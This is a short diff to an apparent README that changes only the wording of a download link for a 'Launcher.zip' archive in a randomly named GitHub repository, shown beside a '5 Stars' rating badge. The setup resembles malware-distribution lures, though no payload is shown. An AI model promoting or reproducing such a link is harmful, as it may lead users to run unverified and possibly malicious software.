@@ -6,4 +6,4 @@
   [![Rating](https://img.shields.io/badge/Rating-5%20Stars-Gold?style=for-the-badge)](#)
 </div>
 
-[Click Here to Download](https://github.com/vdsvb43vdf/sac231cas/raw/refs/heads/main/Launcher.zip)
+[Click to Download](https://github.com/vdsvb43vdf/sac231cas/raw/refs/heads/main/Launcher.zip)
